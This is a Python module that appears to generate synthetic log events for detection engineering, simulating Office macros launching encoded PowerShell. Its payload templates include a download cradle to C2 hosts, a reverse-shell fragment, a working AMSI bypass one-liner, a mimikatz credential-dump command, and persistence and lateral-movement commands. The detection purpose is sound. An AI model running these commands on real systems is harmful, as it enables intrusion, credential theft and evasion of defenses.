"""
simulator/powershell.py
─────────────────────────────────────────────────────────────────────────────
Simulates PowerShell execution launched from a Microsoft Office macro.

Attack chain modelled
─────────────────────
  WINWORD.EXE  →  cmd.exe  →  powershell.exe  (Base64-encoded payload)

Techniques covered
──────────────────
  • T1059.001 — Command and Scripting Interpreter: PowerShell
  • T1027    — Obfuscated Files or Information (Base64 encoding)
  • T1566.001 — Phishing: Spearphishing Attachment (macro delivery)

Usage
─────
    # Print 5 events to stdout (pretty)
    python powershell.py --count 5 --pretty

    # Append 20 events to a log file
    python powershell.py --count 20 --output logs/powershell_sim.jsonl
"""

from __future__ import annotations

import argparse
import base64
import random
import sys
from pathlib import Path
from typing import Any

# Allow running the file directly from its own directory
sys.path.insert(0, str(Path(__file__).parent))
from base import EventGenerator


# ── Realistic payload library ─────────────────────────────────────────────────

# These are *simulated* payloads for educational/detection purposes.
# They do NOT contain functional malicious code.
_SIMULATED_PAYLOADS: list[str] = [
    # Download cradle skeleton
    "IEX(New-Object Net.WebClient).DownloadString('http://{c2}/stager.ps1')",
    # Reverse-shell skeleton
    "$c=New-Object System.Net.Sockets.TCPClient('{c2}',{port});"
    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};",
    # AMSI bypass skeleton
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    # Credential dump skeleton
    "sekurlsa::logonpasswords",
    # Persistence skeleton
    "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'"
    " -Name 'Updater' -Value 'powershell.exe -nop -w hidden -enc {payload}'",
    # Reconnaissance skeleton
    "Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,LastLogonDate",
    # WMI lateral movement skeleton
    "Invoke-WmiMethod -Class Win32_Process -Name Create"
    " -ArgumentList 'powershell -enc {payload}' -ComputerName {target}",
]

_C2_HOSTS: list[str] = [
    "185.220.101.47",
    "104.21.44.180",
    "45.142.212.100",
    "update-service.net",
    "cdn-delivery.xyz",
]

_OFFICE_DOCS: list[str] = [
    "Invoice_Q3_2024.docm",
    "HR_Policy_Update.xlsm",
    "NDA_Template_Signed.docm",
    "Project_Kickoff_Brief.pptm",
    "Payroll_Adjustment.xlsm",
]

_WORD_PROCESSES: list[str] = ["WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE"]

_SWITCH_SETS: list[list[str]] = [
    ["-nop", "-w", "hidden", "-enc"],
    ["-NonInteractive", "-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand"],
    ["-noni", "-nop", "-ep", "bypass", "-enc"],
    ["-ex", "bypass", "-nop", "-w", "1", "-enc"],
]


# ─────────────────────────────────────────────────────────────────────────────
# PowerShellMacroSimulator
# ─────────────────────────────────────────────────────────────────────────────

class PowerShellMacroSimulator(EventGenerator):
    """Simulates PowerShell launched via an Office macro with encoded payloads.

    Each emitted event represents a suspicious process creation event that a
    behavioural detection rule should fire on.

    Parameters
    ----------
    c2_hosts:
        Pool of C2 addresses to interpolate into payload templates.  Falls back
        to the built-in ``_C2_HOSTS`` list when *None*.
    include_parent_chain:
        When *True* (default) the event's ``extra`` dict includes a full
        parent chain field, giving detection engineers a richer telemetry view.
    **kwargs:
        Forwarded to :class:`~base.EventGenerator`.
    """

    SOURCE = "powershell_macro"

    def __init__(
        self,
        c2_hosts: list[str] | None = None,
        include_parent_chain: bool = True,
        **kwargs: Any,
    ) -> None:
        kwargs.setdefault("source", self.SOURCE)
        super().__init__(**kwargs)
        self._c2_hosts = c2_hosts or _C2_HOSTS[:]
        self._include_parent_chain = include_parent_chain

    # ── Core generator ────────────────────────────────────────────────────────

    def generate_event(self) -> dict[str, Any]:
        office_proc = self._choice(_WORD_PROCESSES)
        doc_name    = self._choice(_OFFICE_DOCS)
        c2          = self._choice(self._c2_hosts)
        port        = self._randint(4444, 9999)
        target_host = self._choice(self.hosts)

        # Build the raw payload and Base64-encode it (UTF-16LE, as real PS does)
        raw_payload = (
            self._choice(_SIMULATED_PAYLOADS)
            .replace("{c2}", c2)
            .replace("{port}", str(port))
            .replace("{payload}", self._randhex(32))
            .replace("{target}", self._choice(self.hosts))
        )
        encoded = base64.b64encode(
            raw_payload.encode("utf-16-le")
        ).decode("ascii")

        switches = " ".join(self._choice(_SWITCH_SETS))
        command  = f"powershell.exe {switches} {encoded}"

        extra: dict[str, Any] = {
            "office_document"  : doc_name,
            "encoded_payload"  : encoded,
            "decoded_payload"  : raw_payload,          # included for rule dev
            "c2_address"       : c2,
            "c2_port"          : port,
            "encoding"         : "base64/utf-16le",
        }

        if self._include_parent_chain:
            extra["parent_chain"] = [
                "explorer.exe",
                office_proc,
                "cmd.exe",
                "powershell.exe",
            ]

        event = self._base_event(
            process        = "powershell.exe",
            parent_process = office_proc,
            command        = command,
            host           = target_host,
            severity       = "high",
            tags           = [
                "T1059.001",    # PowerShell
                "T1027",        # Obfuscation
                "T1566.001",    # Phishing attachment
                "macro",
                "encoded-command",
                "lolbas",
            ],
            extra = extra,
        )
        return event

    # ── Scenario generators ───────────────────────────────────────────────────

    def generate_amsi_bypass_event(self) -> dict[str, Any]:
        """Return an event specifically modelling an AMSI bypass attempt."""
        amsi_cmd = (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        )
        encoded = base64.b64encode(amsi_cmd.encode("utf-16-le")).decode("ascii")
        command = f"powershell.exe -nop -w hidden -enc {encoded}"

        return self._base_event(
            process        = "powershell.exe",
            parent_process = self._choice(_WORD_PROCESSES),
            command        = command,
            severity       = "critical",
            tags           = ["T1562.001", "amsi-bypass", "encoded-command"],
            extra          = {
                "encoded_payload" : encoded,
                "decoded_payload" : amsi_cmd,
                "technique"       : "AMSI bypass via reflection",
            },
        )

    def generate_persistence_event(self) -> dict[str, Any]:
        """Return an event modelling registry-based persistence."""
        reg_path = (
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        )
        payload_b64 = self._randhex(64)
        ps_cmd = (
            f"Set-ItemProperty -Path '{reg_path}' -Name 'WindowsUpdate' "
            f"-Value 'powershell.exe -nop -w hidden -enc {payload_b64}'"
        )
        encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
        command = f"powershell.exe -nop -w hidden -enc {encoded}"

        return self._base_event(
            process        = "powershell.exe",
            parent_process = self._choice(_WORD_PROCESSES),
            command        = command,
            severity       = "high",
            tags           = ["T1547.001", "persistence", "registry", "encoded-command"],
            extra          = {
                "registry_key"    : reg_path,
                "encoded_payload" : encoded,
                "decoded_payload" : ps_cmd,
            },
        )


# ── CLI entry point ───────────────────────────────────────────────────────────

def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Simulate PowerShell macro execution events.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--count", "-n", type=int, default=5,
        help="Number of events to generate.",
    )
    parser.add_argument(
        "--scenario",
        choices=["random", "amsi_bypass", "persistence"],
        default="random",
        help="Specific attack scenario to simulate.",
    )
    parser.add_argument(
        "--output", "-o", type=str, default=None,
        help="Output .jsonl file path.  Defaults to stdout.",
    )
    parser.add_argument(
        "--pretty", action="store_true",
        help="Pretty-print JSON to stdout (ignored when --output is set).",
    )
    parser.add_argument(
        "--seed", type=int, default=None,
        help="RNG seed for reproducible output.",
    )
    return parser.parse_args()


def main() -> None:
    args = _parse_args()
    sim = PowerShellMacroSimulator(
        output_file=args.output,
        pretty=args.pretty,
        seed=args.seed,
    )

    for _ in range(args.count):
        if args.scenario == "amsi_bypass":
            sim.emit(sim.generate_amsi_bypass_event())
        elif args.scenario == "persistence":
            sim.emit(sim.generate_persistence_event())
        else:
            sim.emit()


if __name__ == "__main__":
    main()

